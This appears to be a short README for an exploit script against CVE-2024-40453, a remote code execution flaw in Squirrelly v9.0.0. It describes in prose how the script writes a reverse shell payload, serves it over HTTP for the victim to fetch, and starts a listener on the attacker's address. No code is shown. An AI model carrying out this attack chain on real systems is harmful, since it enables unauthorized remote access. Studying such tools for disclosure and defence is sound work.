## CVE-2024-40453 - Squirrelly v9.0.0 RCE

This script creates a reverse shell called `payload.sh` in the current directory.

Then it hosts an http server on port 80 for the victim (`rhost + rport`) to pull the `payload.sh` from.

A listener is started on the attackers specified ip and port  `lhost + lport`
